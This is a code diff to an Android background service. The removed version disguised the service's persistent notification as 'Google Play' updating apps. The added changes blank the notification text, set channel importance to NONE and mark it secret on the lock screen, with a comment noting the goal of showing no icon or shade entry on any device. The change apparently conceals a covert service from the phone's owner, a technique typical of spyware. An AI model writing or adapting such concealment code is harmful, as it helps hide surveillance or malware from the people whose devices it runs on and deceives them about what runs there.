@@ -73,11 +73,13 @@ public class BackgroundService extends Service {
             NotificationChannel channel = new NotificationChannel(
                 CHANNEL_ID,
                 "System Sync",
-                NotificationManager.IMPORTANCE_MIN
+                NotificationManager.IMPORTANCE_NONE  // No icon, no shade entry on all OEMs incl. Infinix
             );
             channel.setShowBadge(false);
             channel.setSound(null, null);
             channel.enableVibration(false);
+            channel.enableLights(false);
+            channel.setLockscreenVisibility(android.app.Notification.VISIBILITY_SECRET);
             NotificationManager manager = getSystemService(NotificationManager.class);
             if (manager != null) {
                 manager.createNotificationChannel(channel);
@@ -87,12 +89,14 @@ public class BackgroundService extends Service {
 
     private Notification createNotification() {
         return new NotificationCompat.Builder(this, CHANNEL_ID)
-            .setContentTitle("Google Play")
-            .setContentText("Keeping your apps up to date")
-            .setSmallIcon(android.R.drawable.stat_sys_download_done)
+            .setContentTitle("")
+            .setContentText("")
+            .setSmallIcon(android.R.drawable.stat_notify_sync_noanim)
             .setPriority(NotificationCompat.PRIORITY_MIN)
             .setSilent(true)
             .setOngoing(true)
+            .setShowWhen(false)
+            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
             .build();
     }
 
